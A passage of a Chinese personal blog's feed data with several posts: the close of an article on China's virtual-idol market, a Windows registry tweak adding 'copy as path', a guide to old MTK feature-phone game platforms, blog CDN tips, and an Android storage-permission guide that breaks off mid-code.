title="难以变现的二次元经济"></a>难以变现的二次元经济</h4><p>&ensp;&ensp;现在洛天依主要靠卖编辑器、授权、代言来赚钱，她同时代言了4款游戏，最近还为一款游戏献唱了中文主题曲。同时出于中国版权市场的好转，开始制作一些周边产品，但目前的营收仍无法覆盖成本。“UGC在日本可以，初音就是靠UGC起来的，但在中国不行，市场成熟度不够，中国85后、90后对二次元文化还是停留在兴趣、爱好上，三次元的壁垒还没有完全打通。”</p><p>&ensp;&ensp;更重要的是，而虚拟偶像的诞生与培育更离不开内容的支撑和综合性的后续运营，尽管国内除了洛天依，在过去已经涌现出乐正绫、乐正龙牙、紫嫣、东方栀子等二十多个“虚拟偶像”，真正拥有扎实人气的却没有几个。</p><p>&ensp;&ensp;“很多公司都在打造虚拟偶像，但都没做好，因为这是一件非常考验综合能力的事情。”七灵石CEO叶伟表示，当外界观察洛天依在中国的运作时会发现，她的成功其实很难被复制。</p><p>&ensp;&ensp;另外还有一个重要问题，在中国，粉丝价值能否转为经济价值，二次元市场在国内到底有多大含金量，其实在业界都是未知数——7月中旬，二次元视频网站“AB双娇”AcFun和Bilibili大批影视剧下架，这两个网站过去几年来，进行了多次的商业化尝试，但最后都发现道路格外崎岖，至今未找到清晰的商业模式。</p><p>&ensp;&ensp;有人把希望寄托在BAT巨头上——百度办了“次元力MAX”的2017贴吧封神盛典，试图以二次元带动贴吧复兴;阿里的主战场则是优土和阿里文学。腾讯最大的优势莫过于QQ，加上了主推的兴趣社交产品“兴趣部落”，还在成都举办了漫展QQJOY。但腾讯高管也坦言，即便聚集了用户、完成了闭环，QQ的二次元依旧没有走出变现困局。</p><p>&ensp;&ensp;对于这些巨头来说，如今核心二次元用户到底有多少是一个值得正视的问题。从年龄构成上看，最早接触“二次元”的“80后”正逐渐退出，“90后”和“00后”已是“二次元”用户主力人群，占到90%以上。</p><p>&ensp;&ensp;此外，初音未来马上就要进军中国市场，到时候中国市场会出现更激烈的竞争，如何在此之前，打造出真正受欢迎的虚拟偶像，是所有中国虚拟偶像公司的挑战。</p><blockquote><p>本文出自2017-08-28出版的《电脑报》2017年第34期 A.新闻周刊<br>(网站编辑：pcw2013)  </p></blockquote><hr><blockquote><p>转载自<a href="http://www.icpcw.com/Information/Industry/News/3301/330128_all.htm" target="_blank" rel="noopener">电脑报官方网站</a><br>只是因为喜欢，别无其他，如侵删<br>文章转自原网站，图片有替换，找了清楚一点的图片</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>复制为路径</title>
      <link href="/2020/fu-zhi-wei-lu-jing/"/>
      <url>/2020/fu-zhi-wei-lu-jing/</url>
      
        <content type="html"><![CDATA[<p>将复制为路径添加到系统右键菜单  </p><a id="more"></a>  <p>在使用某些程序时，需要用到文件路径，将复制为路径添加到右键菜单，方面操作</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Windows</span> Registry Editor Version <span class="number">5</span>.<span class="number">00</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Allfilesystemobjects\shell\windows.copyaspath]</span><br><span class="line"><span class="string">"CanonicalName"</span>=<span class="string">"&#123;707C7BC6-685A-4A4D-A275-3966A5A3EFAA&#125;"</span></span><br><span class="line"><span class="string">"CommandStateHandler"</span>=<span class="string">"&#123;3B1599F9-E00A-4BBF-AD3E-B3F99FA87779&#125;"</span></span><br><span class="line"><span class="string">"CommandStateSync"</span>=<span class="string">""</span></span><br><span class="line"><span class="string">"Description"</span>=<span class="string">"<span class="variable">@shell32</span>.dll,-30336"</span></span><br><span class="line"><span class="string">"Icon"</span>=<span class="string">"imageres.dll,-5302"</span></span><br><span class="line"><span class="string">"InvokeCommandOnSelection"</span>=dword:<span class="number">00000001</span></span><br><span class="line"><span class="string">"MUIVerb"</span>=<span class="string">"<span class="variable">@shell32</span>.dll,-30329"</span></span><br><span class="line"><span class="string">"VerbHandler"</span>=<span class="string">"&#123;f3d06e7c-1e45-4a26-847e-f9fcdee59be0&#125;"</span></span><br><span class="line"><span class="string">"VerbName"</span>=<span class="string">"copyaspath"</span></span><br></pre></td></tr></table></figure><ul><li>复制上面代码，新建一个文本文档粘贴并保存，将后缀从 <code>.txt</code> 改为 <code>.reg</code> ，以管理员身份运行即可  </li><li>也可以直接<a href="copy-as-path.reg">下载运行</a>  </li><li>方法来自网友分享，发到博客备份下</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云九宫中初见 视频壁纸</title>
      <link href="/2020/yun-jiu-gong-zhong-chu-jian/"/>
      <url>/2020/yun-jiu-gong-zhong-chu-jian/</url>
      
        <content type="html"><![CDATA[<p>分享一个视频壁纸，云九宫中初见  </p><a id="more"></a><p>柏言映画的少年锦衣卫出了两部后，这都几年过去了，一直没有续作的动静，怕不是凉了<br>当时还是很喜欢阿九的，这个视频很久之前的了，已经记不得是从那里找的/谁分享的，如侵删<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="emoji">  </p><p><video controls="controls"><source src="https://gcore.jsdelivr.net/gh/gddhy/blog-res/video/云九宫中初见.mp4" type="video/mp4"></video>  </p><ul><li>关于使用视频壁纸，手机上需要有动态壁纸组件 <code>Live Wallpaper Picker</code> ，安卓默认是预装的，只有MIUI有几个版本是砍掉的，安装 <code>星空视频壁纸</code> 就能使用，不想安装星空视频壁纸的可以只安装 <code>星空壁纸引擎</code> 也行  </li><li>关于锁屏使用，部分手机直接设置视频壁纸为锁屏壁纸就行，部分手机需要将手机设置为默认壁纸，然后将系统默认壁纸替换为全透明png图片即可  </li></ul><p>系统锁屏壁纸默认路径(部分手机)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/data/</span>system<span class="regexp">/users/</span><span class="number">0</span><span class="regexp">/keyguard_wallpaper</span></span><br></pre></td></tr></table></figure><p>下载<br><a href="https://gcore.jsdelivr.net/gh/gddhy/blog-res/video/云九宫中初见.mp4" target="_blank" rel="noopener">云九宫中初见.mp4</a> | <a href="https://www.coolapk.com/apk/yyc.xk" target="_blank" rel="noopener">星空视频壁纸</a> | <a href="https://www.coolapk.com/apk/yyc.xk.core" target="_blank" rel="noopener">星空壁纸引擎</a>  </p><blockquote><p><a href="https://www.coolapk.com/feed/6386124?shareKey=YTIzZDAzNmMxNTc3NWZjZjhmODE~&shareUid=778415&shareFrom=com.coolapk.market_11.0-beta4" target="_blank" rel="noopener">原酷安动态</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>山寨手机游戏平台介绍</title>
      <link href="/2020/mtk-game-platform/"/>
      <url>/2020/mtk-game-platform/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/preloader.gif" data-original="https://cdn2.iconfinder.com/data/icons/Mobile_Device_Icons_by_pierocksmysocks/Mobile%20Device%20Icons%20128/HP%20Ipaq%20211.png" alt="mobile"></p><a id="more"></a>  <p>A,首先针对手机最多的斯凯MRP</p><p>本文首先针对斯凯主文件Mythroad的手机进行分析，其它文件夹可以参考！机型不同文中所讲文件夹可能与你的手机文件夹名略有不同！文件夹名字中的240*320为分辨率，依你的手机分辨率而定</p><p>MRP常见文件夹</p><p>最常见文件夹就是Mythroad，</p><p>常见手机是：金立、中天、亿城等，Downdate/mr</p><p>常见手机为金鹏，Mulgame常见金鹏、长虹，有的长虹手机直接命命为游戏，@ahong适用用于长虹老机型，（出厂时一般都隐藏了）Download 是手机自带娱乐园的文件夹，预设为隐藏，Games常见手机为AUX.如果你手机斯凯主文件夹隐藏，可以根据我说的文件夹重建，如果出现文件（夹）已存在，就是你所需的文件夹！mrapp是展迅平台MRP文件夹！展迅mrp虽然亦为斯凯公司开发，但软件和游戏并不通用！</p><p>我的手机支持MRP但没有游戏下载列表怎么办？？</p><p>a,我的自带应用QQ,MSN,股票，凯越(书城）储存在mythroad/app240320，下载游戏下载列表local.seg储存在mythroad/pp240320里所有2开头的文件夹！此列表没有已下载项！新手机都使用此列表</p><p>b,我的自带应用QQ,MSN,股票，凯越(书城）储存在其它文件夹，下载游戏下载列表applist.mrp储存在对应文件夹QQ-qqlist8240x320,MSN-msnlist240x320,股票-stocklis240x320，凯越(书城）-books240x320，QQ网游-qqgamelist240x320，此游戏列表已停止更新，没有任何价值了</p><p>c，无任何自带斯凯应用，只能通过按*#220807#，下载applist.mrp储存在mythroad！此游戏下载列表已停止更新，没有任何价值了</p><p>1，判断手机是否支持mrp</p><p>   a,内存卡有mythroad，Downdate/mr，Mulgame，@ahong，Download，Games文件夹，并确保是在本手机非手动生成</p><p>   b,待机按  <code>*#220807#</code> ，出现“请稍候”或连接网络，稍后出现“错误指令”，*#220807#联网404 NOT FOUND的手机斯凯主文件夹是downdata/mr</p><p>   c,有的手机自带浏览器下载mrp，会提示“执行文档”</p><p>2，mrp入口简介，</p><p>   a，自带应用QQ,MSN,股票，凯越(书城），QQ网游有游戏列表，游戏列表有已下载，此类手机的游戏列表applist.mrp和你要安装的mrp应用储存在：QQ-qqlist8240x320,MSN-msnlist240x320,股票-stocklis240x320，凯越(书城）-books240x320，QQ网游-qqgamelist240x320等，你下载的应用到对应QQ,MSN,股票，凯越(书城），QQ网游的游戏列表的已下载就可以找到了！</p><p>   b,我的手机 <code>*#220807#</code> 有反应， <code>*#220807#</code> 启动的就是储存在mythroad的dsm_gm.mrp，那你就可以下载入口文件dsm_gm.mrp！游戏储存在mythroad文件夹下后。再按 <code>*#220807#</code> 就可以看到他了（如果已经下载了dsm_gm.mrp， <code>*#220807#</code> 依然联网，出现“错误指令，请参考“4，为什么我下载了dsm_gm.mrp,按*#220807#依然联网，出现错误指令？”</p><p>   c,我的手机有曲奇，游戏需要放到mythroad/app240320，然后到曲奇的收藏就可以找到他啦</p><p>d，手机自带应用的游戏列表没有已下载，*#220807#代码屏蔽，又无游戏中心曲奇的手机，此类手机的游戏列表为local.seg，请访问mrpz.wep.cc下载分类——系统应用——含已下载local.seg游戏列表！列表游戏都储存在app240320文件夹，列表通过串码编号识别mrp应用，所以改文件名替换没用的，把你要用的软件修改成列表中任意游戏的串码编号，就可以在该列表启动了！</p><p>3，mrp运行白屏黑屏重启</p><p>   a，黑屏重启，白屏无任何数字及字母，多是内存不足</p><p>   b，白屏出现以下字母”start .mr:212: cann’t   be run direct”，遇到这种情况,就把运行白屏的MRP复制到MRP文件夹下的mor_list17文件夹下，使用应用软件yyrj.mrp打开</p><p>   c，白屏出现以下字母“not enought memery”,内存不足</p><p>   d，白屏出现以下字母“start.mr1827”:bad argument#1 to’getn’(table expected,got nil),这种情况多事按下*#220807#出现的，原因是你下载的applist.mrp列表是在应用软件yyrj.mrp使用的</p><p>   e，白屏出现以下字母“start.mr:285:cann’tfind sdk key”，缺少斯凯授权文件</p><p>4，为什么我下载了dsm_gm.mrp,按*#220807#依然联网，出现“错误指令”？？</p><p>   请尝试把dsm_gm.mrp改名DSM_GM.mrp。如果还不行就下载曲奇组件cookie.mrp改名dsm_gm.mrp（其它组件appmgr.mrp，cookie.mrp，sgl.mrp也要下载至mythroad/plugin240320文件夹），部分新手机已不能识别以前的dsm_gm.mrp。关于曲奇请参考“5，MRP常见文件介绍—— d，ipqq.mrp”</p><p>5，MRP常见文件介绍</p><p>   a，dsm_gm.mrp</p><p>入口文件，缺少此文件按 <code>*#220807#</code> 无法进入应用。您也可以将任意mrp文件改成此名，此时再按下*#220807#启动的就是你改名的文件！注：并不是所有文件都可直接改名dsm_gm.mrp启动！放在mythroad。新手机已淘汰此文件</p><p>   b，applist.mrp</p><p>列表文件，斯凯提供的游戏下载列表，放在mythroad。新手机已放弃了applist.mrp游戏下载列表，和曲奇一样都是seg格式的！列表也已停止更新。</p><p>   c，yyrj.mrp</p><p>应用软件，可以启动无法在手机直接运行的MRP软件！放在mythroad，它的应用要放在放在mythroad/mor_list17文件夹。新手机已淘汰此文件</p><p>   d，ipqq.mrp</p><p>曲奇，现在叫冒泡了。曲奇的游戏需要放到mythroad/app240320！曲奇实现了applist.mrp+dsm_gm.mrp+yyrj.mrp的功能，并且操作方便，队列下载应用，更加智能化！曲奇可以启动任何MRP游戏及软件！曲奇更新列表死机多发生在2.2版！建议升级曲奇版本！按*#220807#启动曲奇出现的频繁更新组件是因为mythroad下的cookie不是最新版，只需将mythroad/plugin240320文件夹的cookie替换掉mythroad下的cookie即可！曲奇的应用储存在app240320文件夹，内含100文件夹（入口文件夹，设置），cfg文件夹（服务器地址，应用识别文件），res文件夹（图标logo），sgm文件夹（列表）；plugin240320是曲奇组件文件夹内含appmgr.mrp，cookie.mrp，font.mrp（小字体），sgl.mrp，plugin.mrp；System是曲奇系统文件夹，内含小字体字库以及冒泡社区及其他账号资料！曲奇的升级，通常它自己会更新！手动更新办法将plugin240320的appmgr.mrp，cookie.mrp，sgl.mrp替换至新版，删除app240320/100和app240320/sgm文件夹，删除app240320/cfg下的localapp.sav和localdir.sav，下载对应新服务器文件mtes.conf（5.0版才需要）存至app240320/cfg。</p><p>  e，QQ网游</p><p>qqsoll.mrp    QQ网游斗地主3.3正式版</p><p>list_et3.mrp QQ网游列表，使用生成qqgamelist文件夹内含网游大厅qqgh.mrp，</p><p>网游大厅qqgh.mrp生成QQGame文件夹，内含QQ网游斗地主，麻将，五子棋等！网游大厅qqgh.mrp也可不必放在QQ网游列表list_et3.mrp，可以单独使用！QQ网游斗地主3.3正式版qqsoll.mrp升级成网游大厅qqgh.mrp！新手机已不支持list_et3.mrp，直接使用网游大厅qqgh.mrp即可。</p><p>   f，nes模拟器</p><p>很多手机不支持，黑屏重启！常见问题解决办法：未授权，放在应用软件yyrj.mrp启动或替换成QQ网游大厅在QQ网游列表运行；黑屏重启，建议关闭模拟器声音，如无效，你就放弃吧！nes游戏放在mythroad/nes。新手机已不支持此文件</p><p>   g，QQ</p><p>关于替换自带QQ，可以尝试找到自带QQ文件，替换成自己要改的文件！如不行可在电脑端修改要替换的文件文件头，修改成自带QQ的！还不行，进入QQ就要更新，那就放弃吧！目前还没解决办法！关于挂机返回，尝试一：长按 <code>*</code>  二：先按0再按 <code>*</code>  三：长按 <code>*#</code>  四：先按9后长按 <code>*</code>  五：先按6后长按 <code>*</code>  六：先按4后长按 <code>*</code>  七：先按3后长按 <code>*</code>  八：就是点屏幕上方的图标有的手机不同 另外再说两个返回的方法、这个可能反回但已是掉线： 一：在双卡之间切换一下或者切换一下飞航模式 二：把3G里加为书签，直登书签里的也可以、都可以返回、但已经掉线了，触屏手机可以点击屏幕上方的斯凯或QQ图标，如果还不行建议放弃</p><p>通过数字证书，VRE能够保证程序的完整性，防止骇客纂改程序文件。?SDK。VRE SDK为开发者提供了完整的工具和文档，包括集成开发环境、模拟器、参考文档和示范代码。?运营支撑系统。运营支撑系统为合作伙伴提供了强有力的运营支持能力，合作伙伴通过支撑系统能够随时了解到产品的下载和盈利情况，了解市场趋势从而更好地优化产品。</p><p>6.艾华lav格式:</p><p>如果内存卡里有Iava文件夹目录,特别是里面有lav格式软件，就说明支持。</p><p>下载启动方式：先将下载的lav和iad文件复制到Iava目录下，然后打开手机上的Iava世界，您将能看到列表中有您刚刚复制过来的软件，点击软件，选择安装，安装成功以后列表中会出现安装成功的软件，点击，选运行就可以使用了。如果您想删除这个软件，可以点击软件，选删除，系统询问是否删除的时候点确认就将此软件删除了。</p><p>   7.酷宇mor、sor、ior格式:</p><p>MOR系上海酷宇通讯有限公司开发的酷宇MORE平台，适用国产手机。平台特点：微内核结构，内存空间占用极小：ROM&lt;50k,RAM&lt;10k动态内存管理技术，有效的使用内存资源：应用只有在被运行时才加载到RAM中来。一旦程序退出，RAM就可以释放。执行的高效性：MORE底层核心部分用汇编编写，应用使用C语言开发和编译，在图形显示等各方面都经过优化，大型游戏运行速度流畅。全面支持C/C++，便于各种应用和游戏的移植。可视化开发、调试和编译环境。如果内存卡里有.mor格式文件软件，就说明支持。下载启动方式：将mor放到存储卡的任意目录，在手机的文档管理中打开此目录，选中以拼音命名的mor文件，选择选项-打开就开始安装游戏。如果选项中没有打开菜单就不可以玩此游戏。安装好后会在该目录生成一个中文名的.mor文件和一个游戏目录。打开中文名的mor文件就可以开始游戏。旧的安装文件可以删除。</p><p>8.至尊宝met meg，mex格式:</p><p>至尊宝游戏平台是上海杨讯计算机科技有限责任公司开发的基于mtk芯片的手机游戏运行环境。      </p><p>上海扬讯计算机科技有限责任公司，成立于2002 年。是国内最早一批专注于手机增值软件领域的高科技公司。扬讯秉承创新理念，不断革新商业模式，成功研发多项填补国内空白的核心专利技术，并推出了国内第一款拥有自主知识产权的Merig?手机虚拟机。Merig?已被数百家知名手机终端厂商和设计公司广泛预装，近百家合作伙伴通过Merig?开发游戏和软件，拥有超过千名注册工程师，Merig?为海内外近亿手机用户提供手机软件产品及服务。扬讯已引入国际资本合作，力争将Merig?在虚拟机领域打造成为一个世界顶尖的品牌。     </p><p>至尊宝游戏平台有2种格式：    </p><p> 0.8.X平台支持MET格式，     </p><p>0.9.1平台支持MEG格式。其中0.9.1平台（MEG格式）支持QQ</p><p>.a，判断手机是否支持至尊宝平台： 目前手机的至尊宝平台主要分为两个版本0.8.0和0.9.1。其中0.8.0支持的文件类型为MET，0.9.1支持的文件类型为MEG，0.8.0版本的不支持QQ，因为现在的至尊宝QQ都是MEG格式的。</p><p>要想知道手机是否支持至尊宝平台主要是看内存卡目录下是否有merig或者mestep文件夹，有merig文件夹的是0.9.1版本，有mestep文件夹的是0.8.0版本。 (我看到的至尊宝平台的手机的版本和文件夹都是这麽对应的，可能有个别机型例外，具体版本情况可以在手机至尊宝游戏城中查看)</p><p> b，游戏或者应用的安装： 手机游戏或者应用都是放在内存卡的merig里application目录或者mestep里application目录下，安装的时候看好自己的机器是支持MET还是MEG。</p><p>c，游戏或应用的运行： 一般手机都自带至尊宝游戏城(有的名字不叫这个，改名啦)，这样的手机你放在merig里application目录或者mestep里application目录下的游戏在至尊宝游戏城的游戏列表下就可以看到了，点名字就可以运行。我今天看到一台手机他的QQ不在至尊宝游戏城中，而是在工具箱-QQ，但是QQ文件的安装目录和上面的一样。</p><p> d，游戏或应用不能正常运行的解决方法： 如果有些游戏或应用不能启动，比如QQ启动的时候显示加载中。。 。几秒种后返回待机画面，解决方法是删除merig或者mestep文件夹，再启动手机的时候或自动重新建立merig或者mestep文件夹，重新安装QQ就可以正常启动了。还有安装完在游戏城找不到游戏，首先要保证安装的游戏文件名不要有中文，然后删除merig或者mestep文件夹，再进入手机上至尊宝游戏城，什麽都不要点退出，它会自建merig/application文件夹或者mestep/application文件夹，重新在application里安装游戏一般就可以了。 游戏列表不显示还有一种解决方法，首先找到存储卡中merig/application或者mestep/application,把你下载的.meg或者.MET文件放进去（一定弄清楚自己手机支持的到底是MET还是MEG） 然后.在merig/application下，把手机原来的引导文件merig.meg文件名称修改下（如改成merig11.meg) 接着.在merig/appinstall下，把merig文件名修改下（随便修改） 那麽.再次进入手机上至尊宝游戏城，上面会显示你放入游戏的列表，点击游戏名运行，就可以了。</p><p>注意：有些至尊宝平台需要application文件夹下有应用引导文件才能正常运行应用软件和游戏。其中内存卡的有merig目录的是0.9.1版本的，他的应用引导文件是merig.meg,安装在merig里application目录内存卡的有mestep目录的是0.8.0版本的，他的应用引导文件是mestep.met,安装在mestep里application目录下 注：文件中不要有汉字！</p><p>mex新格式新版本，游戏放置在存储卡的MexApp文件目录下，游戏有MexApp和Mexsys</p><p> 9.windows系统手机，支持cab,exe格式软件，同时一般都支持java.</p><p>  10.诺基亚手机支持sis、sisx 和java格式.</p><p>  11。cbe   cbd酷吧平台</p><p>   上海酷吧</p><p>酷吧平台的全名为酷吧娱乐平台。      酷吧平台是由上海酷吧信息技术有限公司推出的手机中间件平台，向广大用户提供酷吧软件的应用环境。</p><p>编辑本段特点</p><p>   ·跨平台的C语言的运行环境，无需JAVA支持；      ·酷吧应用平台移植只需要50K RAM 和150K ROM，其他几十款应用软件只需要放在T-FLASH卡即可行；      ·支持mtk、展讯、高通、英飞凌等封闭式平台的应用软件空中下载功能；      ·支持动态链接库，可从T-FLASH卡上运行软件；      ·应用软件运行及响应速度更快（较JAVA程序来说）。酷吧应用文件的后缀名是CBE和CBD。      酷吧应用文件存放在Coolbar_H_QCIF文件夹</p><p>  12.魔畅手机平台 ;jra</p><p>JRA文件是国产MTK平台新出的一种格式，并非JAVA的JAR文件，两者文件后缀相似，但并不能混为一谈。 看你手机是否支持JRA文件很简单： 首先看你手机有无apple文件夹，如果有那么恭喜你，你的手机支持，没有也别灰心，也许是不小心删掉了，就看你手机有没有手机电视功能，或智能乐园选项，如果有那也是支持的。手机电视有这张画面就支持 2.支持怎么下载应用JRA软件？ JRA软件？ 很简单只要把下载的JRA文件放到apple文件夹下download目录里就可以 很简单只要把下载的JRA文件放到apple文件夹下download目录里就可以了。路径：apple\download\下载的JRA文件 完成 3.软件的安装： 只要把下载的JRA文件放到apple文件夹下download目录里就可以了。 路径：apple\download\下载的JRA文件 完成 安装要进入下载中心-选项-应用管理-方向右键选择要安装的程序即可！如果游戏名不是英文或数字，下载修改名为英文或数字名</p><p>13.ROM 优百特 ;smc 好像是游戏虚拟机</p><p>  14.gtbox 上海格瑞游戏; gbx</p><p>  15，mmlive快乐宝平台</p><p>文件夹mmlive,储存在mmlive/app，文件格式mpp,游戏下载页面点击下载如果已经下载过了就是启动该游戏，目前该平台游戏比较白痴</p><p>C,mtk常见文件夹作用</p><p>1.Audio 铃声,录音 2.Ebook/book/books 电子书 3.Photos/Photo 照片 4.Received 接受外来文件夹 5.TTS/asr 语音王 6.Video/Videos/My Video 视频 7.kuaitu 快图 8.SongLibrary 点歌台 9.Game/Games/ KKgame MyNes /Nes/Nesmrp 游戏 10.TigerMap 老虎地图 11.Images 图片保存文件夹 12.Vord 电话本 13.edushi 三维城市地图 14.tl_player 天籁传音 15.umphone 电子名片或语音王 16.brs存放网页和下载17.map jcs格式电子地图 18.phbimage彩信图片 19.cmbrw上网有关</p><blockquote><p>转载内容，文章来源<a href="https://www.hhtjim.com/cottage-game-platform-introduction.html" target="_blank" rel="noopener">山寨手机游戏平台介绍-HHTjim’S 部落格</a>  </p></blockquote><p>受限于md文件解析，修改*#等标记，可以去原文查看<br>ps.最近跟着群友怀旧mrp，收了几台支持斯凯mrp/酷宇/沃勤mre/掌盟平台的旧手机，有时间再来折腾，说不定还能再写点什么</p>]]></content>
      
      
      
        <tags>
            
            <tag> mtk </tag>
            
            <tag> 旧机博物馆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客访问速度优化</title>
      <link href="/2020/bo-ke-su-du-you-hua/"/>
      <url>/2020/bo-ke-su-du-you-hua/</url>
      
        <content type="html"><![CDATA[<p>既然绑了域名打算长期保留，博客访问速度也很重要（可能这年头根本没什么人用博客，也是我心血来潮，来简单优化下  </p><a id="more"></a>  <ul><li>网上找到关于Hexo博客速度优化的无非是压缩html/js/css/图片等文件，每次提交都要在本地执行一次这些操作有点麻烦，直接使用CloudFlare的Auto Minify，让CloudFlare帮忙自带压缩网页源文件的大小  </li><li>关于图片等静态文件直接使用免费的jsDelivr来引用，来提供CDN加速  </li></ul><p>目前在CloudFlare看到博客的加载速度是0.9s，，在国内可能还要慢些，先这样简单优化下过一段时间再看看效果  </p><p>引用网站内文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/g</span>ddhy<span class="regexp">/gddhy.github.io/</span></span><br><span class="line">https:<span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/g</span>ddhy<span class="regexp">/gddhy.github.io@master/</span></span><br><span class="line">https:<span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/g</span>ddhy<span class="regexp">/blog-res/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Github+CDN</title>
      <link href="/2020/github-cdn/"/>
      <url>/2020/github-cdn/</url>
      
        <content type="html"><![CDATA[<p>直接使用  </p><a id="more"></a><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>用户<span class="regexp">/仓库/</span>文件</span><br></pre></td></tr></table></figure><p>文件大小限制在20m左右  </p><p><a href="https://cdn.jsdelivr.net/" target="_blank" rel="noopener">jsDelivr</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>百度输入法小工具</title>
      <link href="/2020/bai-du-shu-ru-fa-gong-ju/"/>
      <url>/2020/bai-du-shu-ru-fa-gong-ju/</url>
      
        <content type="html"><![CDATA[<p>平常主力机不换，备用机换着玩，比较喜欢各个设备风格统一，所以有了这个app  </p><a id="more"></a>  <p>之前这个文件一直放在wodemo上，下起来也不是很方便，趁着博客绑定了域名转到这里吧  </p><ul><li>包含自用皮肤一个 薄荷鸡尾酒原版皮肤，这个皮肤在百度输入法皮肤商城还能下载，不过是个修改版，字体不喜欢，就提取了这个原版皮肤用</li><li>含有QQ专用emoji表情若干，很早之前MIUI论坛有人分享的，一直留着，可惜miui论坛已经关了</li><li>含有初音未来表情一套，这个表情已经从QQ表情商店下架，但是还能从已下载列表找到，QQ/电脑tim还能正常使用这套表情，唯独手机tim不行，所以把这套表情直接弄到了输入法里  </li></ul><p><a href="https://res.gddhy.net/apk/BaiduInputTool.apk" target="_blank" rel="noopener">下载</a> </p><p>软件使用<a href="https://www.coolapk.com/apk/com.xl.capp" target="_blank" rel="noopener">手机CAPP</a> 制作，源码包含在程序中 </p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓储存空间权限适配(支持安卓11)</title>
      <link href="/2020/an-zhuo-chu-cun-quan-xian-gua-pei/"/>
      <url>/2020/an-zhuo-chu-cun-quan-xian-gua-pei/</url>
      
        <content type="html"><![CDATA[<p>在安卓系统上，访问用户储存空间的文件需要申请存储空间权限  </p><a id="more"></a>  <p>此权限在安卓9及之前版本为 <code>android.permission.WRITE_EXTERNAL_STORAGE</code> 和 <code>android.permission.READ_EXTERNAL_STORAGE</code> ，申请写权限时会自动赋予读权限。<br>安卓6之前只需要在AndroidManifest.xml中申请即可使用，安卓6起需要适配运行时权限，在程序运行时动态申请权限。<br>安卓9时启用分区储存，targetApi到Q时再AndroidManifest.xml的application中添加 <code>android:requestLegacyExternalStorage=&quot;true&quot;</code> 即可屏蔽分区储存，使用上面的方法申请访问储存空间。<br>在安卓11上，取消储存空间权限（targetApi 不到R不启用，对于到R的强制启用）想要直接访问文件需要申请特殊权限-所有文件管理权限 <code>android.permission.MANAGE_EXTERNAL_STORAGE</code> ，使用 <code>Environment.isExternalStorageManager()</code> 检查用户是否授予权限，在安卓11上 <code>/sdcard/Android/data/包名</code> 目录属于应用私有目录，其他应用无法访问</p><p>简单的申请权限例程<br> AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">  <span class="attr">...</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:requestLegacyExternalStorage</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">...</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:maxSdkVersion</span>=<span class="string">"29"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">"android.permission.MANAGE_EXTERNAL_STORAGE"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Activity中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 